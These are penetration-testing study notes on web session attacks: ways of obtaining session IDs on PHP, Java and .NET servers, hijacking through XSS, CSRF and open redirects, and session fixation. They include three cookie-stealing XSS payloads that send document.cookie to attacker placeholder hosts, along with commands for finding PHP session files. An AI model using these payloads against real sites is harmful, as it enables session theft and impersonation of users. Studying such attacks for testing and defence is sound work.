### General Notes

These are attacks that are related to the [[Sessions]] of users.
- A session is used to continuously identify users, such that already known information doesn't need to be retransmitted.
- A user on a web application is said to have a session such that it informs the servers about the identity of the user as the user interacts with the web application.
 
If an attacker manages to grab a hold of a user session, then the attacker can impersonate that user and perform actions acting as the user.

---
### Obtaining Session Identifiers

There are several ways to have access to session identifiers belonging to another user:
- Traffic sniffing using a tool like [[Wireshark]].
- [[Cross Site Scripting (XSS)]]: crafting an XSS payload that sends to the attacker the user session information.
- Browser history.
- Log diving
- Access to a database with session information.

#### Obtaining Identifiers Post Exploitation 

Given the case that the server has already been exploited, these methods below are ways of obtaining the session identifiers given access to the server.

###### PHP Session IDs: `PHPSESSID`

The location where session IDs are saved on a PHP server is identified in the `PHP.ini` file in an entry called `session.save_path`.
- Therefore, the first step is identifying *where* the `PHP.ini` file is, and then checking the value of the `session.save_path` variable.
```bash
locate php.ini
cat /path/of/php.ini | grep "session.save_path"
```

The output of this command will tell us where the session identifiers are stored.
- The files in this directory are of the format: `sess_valueofphpsessid`.

###### Java Session IDs:

The `manager` element is responsible for creating and storing information about [[HTTP]] sessions.
- The session data is stored in either a default location called `SESSIONS.ser`, or in a storage location chosen by the `Store` element.
- More info [here](https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).

###### .NET Session IDs

Session data can be found in:
- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_.
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_.
- An SQL Server

More info:  [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/).

---
### Session Hijacking

The attacker takes advantage of insecure session identifiers and finds a way to obtain them.
- The attacker then uses them to authenticate to the server and impersonate the victim.

Below are a list of techniques that can be used to perform session hijacking.
##### Using [[Cross Site Scripting (XSS)]]

Once an XSS vulnerability is found, it can be used to perform session related attacks.

For XSS to be used to obtain session cookies:
- The cookies should be carried in all [[HTTP]] requests.
- The cookies should be accessible by JavaScript, that is, the `httpOnly` flag should be off.

To obtain the session cookie, the JavaScript payload must interact with the `document.cookie` object, and somehow send it to the attacker.
- This can be done manually by setting up a listener on the attacker machine.
- Or by using tools, like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/).

Some common XSS scripts to send the cookie to the attacker machine.
```JavaScript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http:LINK/log.php?c=' + document.cookie;"></video>

<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

- For the second script, we assume there is a `log.php` file hosted at the machine with the given IP that can read the value of the `c` query parameter that we send as the cookie.
- Using [[netcat]] is also option, where we simply set up a listener, and the script sends a request to the listener address with the cookie as a parameter in the URL. 

> After the session cookie is obtained by the attacker, the attacker now has the ability to use this session ID and impersonate the user by hijacking the user session.

##### Using [[Cross Site Request Forgery (CSRF)]]

This is a technique that requires a user to interact with a malicious website that performs an action for them.
- The users need to be logged in for the attack to work, the attack being performing an action for the user that they do not intend to do.

> This can be done by making the user visit a website that we create, and this fake website performs an action like submitting a form to the actual website that they thought they were at.

##### Using Open Redirects

This is an attack where a website contains a vulnerability in a redirection in one of its pages.
- If the website blindly follows the redirection URL without implementing any checks, then an attacker can control the destination.

---
### Session Fixation

This attack takes place when an attacker fixes a valid session ID and then tricks the victim to log into the web application with this fixed ID that the attacker knows and specifies.
- Once the user logs in with the previously known session, the attacker can then hijack that session, allowing the attacker to impersonate the victim user.

> The goal of session fixation is to reach session hijacking.

To perform this attack, there are 3 steps to follow:
1. *Obtain a valid session identifier*, which can be done authenticating as a user, or by simply opening the web application.
2. *Fixate this valid session identifier*, which is the case if the session value remains the same before and after logging in **AND** the session ID can be accepted from the URL query parameters or `POST` data parameters.
3. *Trick the victim into establishing a session using the fixed session ID*, which can be done by crafting a URL and making the victim click it, thus, the web application assigns the session value to that user.

##### Identifying Session Fixation

Check if there are any valid session identifier values **present in the URL**, and if its value is **propagated to a cookie** on the webpage.
- Try testing it by entering a random value in the parameter, and see if this value gets saved in the cookie. If that is the case, then there is the fixation vulnerability.

---


